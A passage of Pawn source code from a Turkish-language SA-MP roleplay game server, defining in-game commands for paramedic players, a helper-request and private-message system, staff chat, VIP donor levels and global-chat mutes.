				format(string, sizeof(string), "* %s adlý kiþiyi sedyeye koydun, artýk götürebilirsin.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* %s, %s adlý kiþiyi sedyeye koydu,kemeri emniyetlice baðladý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
                Log("logs/ytasi.log", string);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

				SetPVarInt(giveplayerid, "OnStretcher", 1);
				SetPVarInt(playerid, "TickEMSMove", SetTimerEx("MoveEMS", 30000, false, "d", playerid));
				SetPVarInt(playerid, "MovingStretcher", giveplayerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Oyuncunun taþýnabilmesi için yaralý olmasý gerek!");
			}
		}
	}
	return 1;
}

CMD:yaracaat(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] ==3)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
            SendClientMessage(playerid, COLOR_GREY, "Arabadayken bunu yapamazsýn!");
            return 1;
        }

        new string[128], giveplayerid, seat;
        if(sscanf(params, "ud", giveplayerid, seat)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yaracaat [Oyuncu ID/Ýsim] [seatid]");

        if(IsPlayerConnected(giveplayerid))
		{
            if(giveplayerid != INVALID_PLAYER_ID)
			{
                if(seat < 2 || seat > 3)
				{
                    SendClientMessage(playerid, COLOR_GRAD1, "Koltuk ID'si 2 veya 3 olmalý.");
                    return 1;
                }
                if(GetPVarInt(giveplayerid, "Injured") != 1)
				{
                    SendClientMessage(playerid, COLOR_GREY, "   Hasta yaralý deðil - onu yükleyemezsin.");
                    return 1;
                }
                if(IsPlayerInAnyVehicle(giveplayerid))
				{
                    SendClientMessage(playerid, COLOR_GREY, "   Hasta arabanýn içinde - onu yükleyemezsin.");
                    return 1;
                }
                if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
                    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendini yükleyemezsin!"); return 1; }
                    if(PlayerInfo[giveplayerid][pJailed] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "Hapisteki oyuncular için bu komutu kullanamazsýn.");
                    new carid = gLastCar[playerid];

                    if(IsAnAmbulance(carid))
					{
                        new Float:pos[6];
                        GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
                        GetPlayerPos(giveplayerid, pos[3], pos[4], pos[5]);
                        GetVehiclePos(carid, pos[0], pos[1], pos[2]);
                        if(floatcmp(floatabs(floatsub(pos[0], pos[3])), 10.0) != -1 &&
                            floatcmp(floatabs(floatsub(pos[1], pos[4])), 10.0) != -1 &&
                            floatcmp(floatabs(floatsub(pos[2], pos[5])), 10.0) != -1) return false;
                        format(string, sizeof(string), "* Ilkyardým görevlisi %s tarafýndan yüklendiniz.", GetPlayerNameEx(playerid));
                        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* Hasta %s adlý kiþiyi yüklediniz.", GetPlayerNameEx(giveplayerid));
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s, %s adlý kiþiyi ambulansa bindirdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        SetPVarInt(giveplayerid, "EMSAttempt", 3);
                        ClearAnimations(giveplayerid, 1);
                        PutPlayerInVehicle(giveplayerid,carid,seat);
                        TogglePlayerControllable(giveplayerid, false);
                    }
                    else
					{
                        SendClientMessage(playerid, COLOR_GRAD2, "Son araban ambulans olmasý gerekiyor!");
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_GREY, "Arabana ya da oyuncuya yeterince yakýn deðilsin!");
                    return 1;
                }
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
            return 1;
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD2, "   LSFMD üyesi deðilsin!");
    }
    return 1;
}

CMD:yteslimet(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction]==3||PlayerInfo[playerid][pLeader]==3)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
			new string[128], giveplayerid;
		    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yteslimet [Oyuncu ID/Ýsim]");

            new carid = GetPlayerVehicleID(playerid);
            new caridex = GetPlayerVehicleID(giveplayerid);
            if(IsAnAmbulance(carid))
			{
                if(carid == caridex)
				{
                    if(IsAtDeliverPatientPoint(playerid))
					{
                        if(playerid == giveplayerid)
						{
                            SendClientMessage(playerid, COLOR_GRAD2, "Kendini hastaneye teslim edemezsin!");
                            return 1;
                        }
                        if(GetPVarInt(giveplayerid, "Injured") == 0)
						{
                            return SendClientMessage(playerid, COLOR_GRAD2, "Oyuncu yaralý deðil!");
                        }
                        if(playerTabbed[giveplayerid] == 1)
						{
                            SendClientMessage(playerid, COLOR_GRAD2, "Oyuncu oyunu durdurmuþ, þimdilik onu teslim edemezsin!");
                            return 1;
                        }
                        SetPlayerHealth(giveplayerid, 100);
                        if(GetPVarType(giveplayerid, "STD"))
						{
							DeletePVar(giveplayerid, "STD");
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "Hastane yardýmý sayesinde STD mikrobu taþýmýyorsun!");
                        }
                        GivePlayerCash(giveplayerid, -100);
                        GivePlayerCash(playerid,250);
                        KillEMSQueue(giveplayerid);
                        DeletePVar(giveplayerid, "DoktorMasrafi");
                        SendClientMessage(giveplayerid, TEAM_CYAN_COLOR, "Doktor: Týbbi fatura $100. Ýyi günler!");
                        format(string,sizeof(string),"Hastayý teslim ettiðin için $250 aldýn!");
                        SendClientMessage(playerid, TEAM_CYAN_COLOR, string);
                        SetPlayerPos(giveplayerid, 1169.7588,-1351.5490,2423.0461);
                        SetPlayerInterior(giveplayerid, 1);
                        PlayerInfo[giveplayerid][pInt] = 1;

		    			LoadObjectsForPlayer(giveplayerid);

                        PlayerInfo[playerid][pPatientsDelivered]++;
                        format(string, sizeof(string), "Ilkyardým Þoförü %s hasta %s adlý kiþiyi hastaneye teslim etti.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
                        Log("logs/yteslimet.log", string);
						SendRadioMessage(3, TEAM_MED_COLOR, string);

                        if(IsPlayerInRangeOfPoint(playerid, 5.0,1142.4733,-1326.3633,13.6259) || IsPlayerInRangeOfPoint(playerid, 5.0, 1165.1564,-1368.8240,26.6502))
						{
                            SetPlayerVirtualWorld(giveplayerid, 1);
                            PlayerInfo[giveplayerid][pVW] = 1;
                        }
                        else if(IsPlayerInRangeOfPoint(playerid, 5.0,2027.0599,-1410.6870,16.9922) || IsPlayerInRangeOfPoint(playerid, 5.0, 2024.5742,-1382.7844,48.3359))
					 	{
                            SetPlayerVirtualWorld(giveplayerid, 2);
                            PlayerInfo[giveplayerid][pVW] = 2;
                        }
                    }
                    else
					{
                        SendClientMessage(playerid, COLOR_GRAD2, "Herhangi bir teslim noktasýnda deðilsin - hastanelerin yakýnýna bak.");
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_GRAD2, "Hastayý teslim etmek için senin aracýnda olmasý gerekir.");
                }
            }
            else
			{
                SendClientMessage(playerid, COLOR_GRAD2, "LSFMD aracýnda deðilsin.");
            }
        }
    }
    return 1;
}
/*
Global kanal deaktif edildi
CMD:toggc(playerid, params[])
{
	if(GlobalChat[playerid] == 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "Global kanalýný açtýn, /g ile konuþabilirsin.");
        GlobalChat[playerid] = 1;
	}
	else if(GlobalChat[playerid] == 1)
	{
        SendClientMessage(playerid, COLOR_WHITE, "Global kanalýný kapattýn.");
        GlobalChat[playerid] = 0;
	}
	return 1;
}

CMD:g(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pGCMuted] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu kanaldan mutelisin.");
		return 1;
	}
	new string[128];
	if(GlobalChatTimer[playerid] > 0)
	{
		format(string, sizeof(string), "Bu kanalda tekrar konuþabilmek için %d saniye beklemelisin.", GlobalChatTimer[playerid]);
		SendClientMessage(playerid, COLOR_GREY, string);
		return 1;
	}
	if(GlobalChat[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Global sohbette deðilsin, /toggc yaz.");
		return 1;
	}

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/g) [text]");

	if(strlen(params) > 80)
	    return SendClientMessage(playerid, COLOR_GREY, "Mesaj çok uzun - limit 80 karakter.");

	if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pDonator] == 1)
	{
		format(string, sizeof(string), "(( Yakut VIP %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pDonator] == 2)
	{
		format(string, sizeof(string), "(( Safir VIP %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pDonator] == 3)
	{
		format(string, sizeof(string), "(( Elmas VIP %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pHelper] == 1)
	{
		format(string, sizeof(string), "(( Yeni Yardýmcý %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 2;
	}
	else if(PlayerInfo[playerid][pHelper] == 2)
	{
		format(string, sizeof(string), "(( Kýdemli Yardýmcý %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 2;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pDonator] == 1)
	{
		format(string, sizeof(string), "(( Level %d Oyuncu %s: %s ))", PlayerInfo[playerid][pLevel], GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pDonator] == 0)
	{
		format(string, sizeof(string), "(( Level %d Oyuncu %s: %s ))", PlayerInfo[playerid][pLevel], GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		format(string, sizeof(string), "(( Level %d Admin %s: %s ))", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), params);
	}

	foreach(Player, i)
	{
		if(GlobalChat[i] == 1)
		{
			SendClientMessage(i, COLOR_CYAN, string);
		}
	}
	return 1;
}
*/
CMD:yardimiste(playerid, params[]) {
	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /yardimiste [help reason]");

	if(PlayerInfo[playerid][pNMute] == 0 && PlayerInfo[playerid][pHelper] == 0) {
	    SetPVarString(playerid, "helpreq", params);

	    SendClientMessage(playerid, COLOR_WHITE, "Yardým isteðiniz yardýmcý takýmýna gönderildi.");

	    new
	        szMessage[128];

	    format(szMessage, sizeof(szMessage), "YardýmKomutu: %s (%d) yardým isteði gönderdi; %s", GetPlayerNameEx(playerid), playerid, params);
	    HelperBroadcast(COLOR_LIGHTBLUE, szMessage, 1);
	} else SendClientMessage(playerid, COLOR_GREY, "Newbie Kanalýndan muteliysen yardým isteði gönderemezsin, /rapor kullanarak mute kaldýrýlmasýný talep etmelisin.");

	return 1;
}

CMD:yardimcilar(playerid, params[]) {
    if(PlayerInfo[playerid][pHelper] >= 2 || PlayerInfo[playerid][pAdmin] >= 1) {
        new
            iCount,
            szMessage[128];

        foreach(Player, x) {
            if(PlayerInfo[x][pHelper] > 0) {
				format(szMessage, sizeof(szMessage), "Level %d Yardýmcý: %s | Kabul Edilen Istekler: %d", PlayerInfo[x][pHelper], GetPlayerNameEx(x), PlayerInfo[x][pAcceptReport]);
				SendClientMessage(playerid, COLOR_GREY, szMessage);

				iCount++;
			}
		}

		if(iCount == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "Þu an online yardýmcý yok.");
    }
	return 1;
}

CMD:yardimistekleri(playerid, params[]) {
    if(PlayerInfo[playerid][pHelper] >= 3 || PlayerInfo[playerid][pAdmin] >= 1) {
        new
            szReason[100],
            iCount,
            szMessage[128];

		foreach(Player, x) {
		    if(GetPVarType(x, "helpreq") != 0) {
			    GetPVarString(x, "helpreq", szReason, sizeof(szReason));
			    format(szMessage, sizeof(szMessage), "Isim: %s (ID: %d) | Mesaj: %s", GetPlayerNameEx(x), x, szReason);
			    SendClientMessage(playerid, COLOR_WHITE, szMessage);

				iCount++;
		    }
		}

		if(iCount == 0)
		    SendClientMessage(playerid, COLOR_GREY, "Þu an aktif yardým isteði yok.");
	}
	return 1;
}

CMD:pmkabul(playerid, params[]) {
	if(PlayerInfo[playerid][pHelper] >= 3 || PlayerInfo[playerid][pAdmin] >= 1) {
		new
		    szMessage[128],
		    szReason[100],
			iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /kabuletpm [playerid]");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(GetPVarType(iTarget, "helpreq") == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "Belirlenen oyuncunun yardým isteði yok.");

		GetPVarString(iTarget, "helpreq", szReason, sizeof(szReason));

		format(szMessage, sizeof(szMessage), "%s (ID: %d) adlý kiþinin yardým isteðini kabul ettin; %s", GetPlayerNameEx(iTarget), iTarget, szReason);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "/pm kullanarak mesajlarý deðiþebilirsin.");

		PlayerInfo[playerid][pAcceptReport]++;

		HelperPM[iTarget] = playerid;
		HelperPM[playerid] = iTarget;

		format(szMessage, sizeof(szMessage), "%s yardým isteðini kabul etti, '/pm' kullanarak yanýtlayabilirsin.", GetPlayerNameEx(playerid));
		SendClientMessage(iTarget, COLOR_LIGHTBLUE, szMessage);

		format(szMessage, sizeof(szMessage), "YardýmKomutu: %s, %s (ID: %d) adlý kiþinin yardým isteðini kabul etti(PM).", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget), iTarget);
		HelperBroadcast(COLOR_ORANGE, szMessage, 1);

		DeletePVar(iTarget, "helpreq");
	}
	return 1;
}

CMD:hpmkapat(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2 || PlayerInfo[playerid][pHelper] >= 2) {
        if(HelperPM[playerid] != INVALID_PLAYER_ID) {
			new
				szMessage[128];

			format(szMessage, sizeof(szMessage), "%s yardýmcý özel mesaj oturumunu bitirdi.", GetPlayerNameEx(playerid));
			SendClientMessage(HelperPM[playerid], COLOR_LIGHTBLUE, szMessage);

			format(szMessage, sizeof(szMessage), "%s adlý kiþi ile yardýmcý özel mesaj oturumunu bitirdin.", GetPlayerNameEx(HelperPM[playerid]));
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			HelperPM[HelperPM[playerid]] = INVALID_PLAYER_ID;
			HelperPM[playerid] = INVALID_PLAYER_ID;
        } else SendClientMessage(playerid, COLOR_GREY, "Aktif olarak kimseye yardým etmiyorsun.");
    }
	return 1;
}

CMD:hpm(playerid, params[])
{
	new
		iMessage[128];
	if(sscanf(params, "s[128]", iMessage))
		return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /pm [mesaj]");

	if(HelperPM[playerid] == INVALID_PLAYER_ID && (PlayerInfo[playerid][pHelper] >= 3 || PlayerInfo[playerid][pAdmin] >= 1))
		return SendClientMessage(playerid, COLOR_GREY, "Aktif olarak kimseye yardým etmiyorsun.");

	if(HelperPM[playerid] == INVALID_PLAYER_ID && (PlayerInfo[playerid][pHelper] == 0 || PlayerInfo[playerid][pAdmin] == 0))
		return SendClientMessage(playerid, COLOR_GREY, "Kimse sana aktif olarak yardým etmiyor.");

	new
		szMessage[128];

	format(szMessage, sizeof(szMessage), "(( %s kiþisinden gelen PM: %s ))", GetPlayerNameEx(playerid), iMessage);
	SendClientMessage(HelperPM[playerid], COLOR_YELLOW, szMessage);

	format(szMessage, sizeof(szMessage), "(( %s kiþisine gönderilen PM: %s ))", GetPlayerNameEx(HelperPM[playerid]), iMessage);
	SendClientMessage(playerid, COLOR_YELLOW, szMessage);
	return 1;
}

CMD:yardimkabul(playerid, params[]) {
	if(PlayerInfo[playerid][pHelper] >= 3 || PlayerInfo[playerid][pAdmin] >= 1) {
		new
		    szMessage[128],
		    szReason[100],
			iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /kabulethelp [playerid]");

		if(GetPVarInt(playerid, "EventToken") == 1 || PlayerInfo[playerid][pJailTime] > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(GetPVarType(iTarget, "helpreq") == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "Belirlenen oyuncu yardým istemedi.");

		if(GetPVarType(playerid, "posX") != 0)
			return SendClientMessage(playerid, COLOR_GREY, "Aktif olarak birine yardým ediyorsun.");

		GetPVarString(iTarget, "helpreq", szReason, sizeof(szReason));

		format(szMessage, sizeof(szMessage), "%s adlý kiþinin yardým isteðini kabul ettin; %s", GetPlayerNameEx(iTarget), szReason);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		SetPVarFloat(playerid, "posX", PlayerInfo[playerid][pPos_x]);
        SetPVarFloat(playerid, "posY", PlayerInfo[playerid][pPos_y]);
        SetPVarFloat(playerid, "posZ", PlayerInfo[playerid][pPos_z]);
        SetPVarInt(playerid, "posInt", GetPlayerInterior(playerid));
        SetPVarInt(playerid, "posVW", GetPlayerVirtualWorld(playerid));
		new Float:hp;
		GetPlayerHealth(playerid, hp);
        SetPVarFloat(playerid, "HelpHealth", hp);
		new Float: fArmour;
		if(GetPlayerArmour(playerid, fArmour) < ValidArmor[playerid]) GetPlayerArmour(playerid, PlayerInfo[playerid][pArmor]);
		else PlayerInfo[playerid][pArmor] = ValidArmor[playerid];
        SetPVarFloat(playerid, "HelpArmour", PlayerInfo[playerid][pArmor]);

		Helper[playerid] = CreateDynamic3DTextLabel("HELPER", COLOR_LIGHTBLUE, 0.0, 0.0, 0.0, 7.5, playerid, INVALID_VEHICLE_ID, 1, GetPlayerVirtualWorld(iTarget), GetPlayerInterior(iTarget), playerid, 7.5);


		TogglePlayerControllable(iTarget, 0);
		UnfreezeDelay(iTarget);

        GetPlayerPos(iTarget, PlayerInfo[iTarget][pPos_x], PlayerInfo[iTarget][pPos_y], PlayerInfo[iTarget][pPos_z]);
        SetPlayerPos(playerid, PlayerInfo[iTarget][pPos_x], PlayerInfo[iTarget][pPos_y], PlayerInfo[iTarget][pPos_z]);
		SetPlayerInterior(playerid, GetPlayerInterior(iTarget));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(iTarget));

		if(GetPlayerInterior(iTarget) > 0 || GetPlayerVirtualWorld(iTarget) > 0) {
			LoadObjectsForPlayer(playerid);
		}

		PlayerInfo[playerid][pAcceptReport]++;

		format(szMessage, sizeof(szMessage), "%s senin yardým isteðini kabul etti.", GetPlayerNameEx(playerid));
		SendClientMessage(iTarget, COLOR_LIGHTBLUE, szMessage);

		format(szMessage, sizeof(szMessage), "YardýmKomutu: %s, %s (ID: %d) kiþisinin yardým isteðini kabul etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget), iTarget);
		HelperBroadcast(COLOR_ORANGE, szMessage, 1);

		DeletePVar(iTarget, "helpreq");
	}
	return 1;
}

CMD:yardimbitir(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2 || PlayerInfo[playerid][pHelper] >= 2) {
        if(GetPVarType(playerid, "posX") != 0) {
	        SetPlayerInterior(playerid, GetPVarInt(playerid, "posInt"));
	        SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "posVW"));
	        SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "HelpArmour"));
	        SetPlayerHealth(playerid, GetPVarFloat(playerid, "HelpHealth"));
	        SetPlayerPos(playerid, GetPVarFloat(playerid, "posX"), GetPVarFloat(playerid, "posY"), GetPVarFloat(playerid, "posZ"));
			DestroyDynamic3DTextLabel(Helper[playerid]);

	        SendClientMessage(playerid, COLOR_WHITE, "Çýkmadan önceki bulunduðun noktaya ýþýnlandýn.");

	        DeletePVar(playerid, "posX");
	        DeletePVar(playerid, "posY");
	        DeletePVar(playerid, "posZ");
	        DeletePVar(playerid, "posInt");
	        DeletePVar(playerid, "posVW");
	        DeletePVar(playerid, "HelpHealth");
	        DeletePVar(playerid, "HelpArmour");
        } else SendClientMessage(playerid, COLOR_GREY, "Aktif olarak birine yardým etmiyorsun.");
    }
	return 1;
}

CMD:hkanalikapat(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1) {
        switch(GetPVarInt(playerid, "cschat")) {
			case 0: {
			    SetPVarInt(playerid, "cschat", 1);
			    SendClientMessage(playerid, COLOR_WHITE, "Artýk helper kanaldaki mesajlarý görmeyeceksin. /hkanalikapat ile mesajlarý tekrar görebilirsin.");
			}
			case 1: {
			    DeletePVar(playerid, "cschat");
			    SendClientMessage(playerid, COLOR_WHITE, "Artýk helper kanaldaki mesajlarý tekrar görebilirsin.");
			}
		}
    }
	return 1;
}

CMD:c(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
	{
		if(isnull(params))
		    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /c(ommunitystaff) [mesaj]");

		new
		    string[128];

		if(PlayerInfo[playerid][pAdmin] >= 1)
			format(string, sizeof(string), "** {00BBFF}Level %d Admin %s: {FFFFFF}%s", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 1)
		    format(string, sizeof(string), "*** Stajyer Helper %s: {FFFFFF}%s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 2)
		    format(string, sizeof(string), "*** Level 1 Helper %s: {FFFFFF}%s", GetPlayerNameEx(playerid), params);
  		else if(PlayerInfo[playerid][pHelper] == 3)
		    format(string, sizeof(string), "*** Level 2 Helper %s: {FFFFFF}%s", GetPlayerNameEx(playerid), params);
  		else if(PlayerInfo[playerid][pHelper] == 4)
		    format(string, sizeof(string), "*** Level 3 Helper %s: {FFFFFF}%s", GetPlayerNameEx(playerid), params);
  		else if(PlayerInfo[playerid][pHelper] == 5)
		    format(string, sizeof(string), "*** Level 4 Helper %s: {FFFFFF}%s", GetPlayerNameEx(playerid), params);
   	    else if(PlayerInfo[playerid][pHelper] == 6)
		    format(string, sizeof(string), "*** Level 5 Helper %s: {FFFFFF}%s", GetPlayerNameEx(playerid), params);			

		foreach(Player, x) {
		    if(PlayerInfo[x][pAdmin] > 0 && GetPVarInt(x, "cschat") == 0 || PlayerInfo[x][pHelper] >= 1 && GetPVarInt(x, "cschat") == 0)
		        SendClientMessage(x, COLOR_CYAN, string);
		}
	}
	return 1;
}

CMD:setdonator(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 9) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
     	SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   		}
		new string[128], giveplayerid, level;
		if(sscanf(params, "ud", giveplayerid, level)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setdonator [player] [level]");
			SendClientMessage(playerid, COLOR_GRAD3, "Kullanýlabilir Level: |0| Yok |1| Yakut |2| Safir |3| Elmas");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(level < 0 || level > 3)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "VIP seviyesi 0-3 arasýnda olmalý!");
					return 1;
				}
				PlayerInfo[giveplayerid][pDonator] = level;

				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
				if(level == 0)
				{
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin VIP Level'ini Yok (%d)yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "VIP Levelin Admin %s tarafýndan Yok olarak ayarlandý.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdminKomutu: %s, %s (IP:%s) kiþisinin VIP Levelini Yok (%d) yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
				if(level == 1)
				{
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin VIP Level'ini Yakut (%d)yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "VIP Levelin Admin %s tarafýndan Yakut olarak ayarlandý.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdminKomutu: %s, %s (IP:%s) kiþisinin VIP Levelini Yakut (%d) yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
				if(level == 2)
				{
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin VIP Level'ini Safir (%d)yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "VIP Levelin Admin %s tarafýndan Safir olarak ayarlandý.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdminKomutu: %s, %s (IP:%s) kiþisinin VIP Levelini Safir (%d) yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
				if(level == 3)
				{
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin VIP Level'ini Elmas (%d)yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "VIP Levelin Admin %s tarafýndan Elmas olarak ayarlandý.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdminKomutu: %s, %s (IP:%s) kiþisinin VIP Levelini Elmas (%d) yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:gcto(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gcto [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pGCMuted] == 0)
			{
				PlayerInfo[giveplayerid][pGCMutedTime] = 15*60;
				PlayerInfo[giveplayerid][pGCMuted] = 2;
				format(string, sizeof(string), "AdminKomutu: %s, %s kiþisini geçici olarak Global Kanaldan blokladý, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);

				format(string, sizeof(string), "%s tarafýndan Global Kanalýndan bloklandýn, sebep: %s.", GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);

				SendClientMessage(giveplayerid, COLOR_GRAD2, "Global Kanalý 15 dakika kullanamayacaksýn.");
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Gelecekte Global Kanalýný kötüye kullanman, yetkilerinin kaybýna veya sunucudan banlanmana sebep olacak.");


				format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan Global Kanaldan geçici olarak bloklandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Oyuncu zaten Global Kanal kullanamýyor.");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:gcreset(playerid, params[])
{
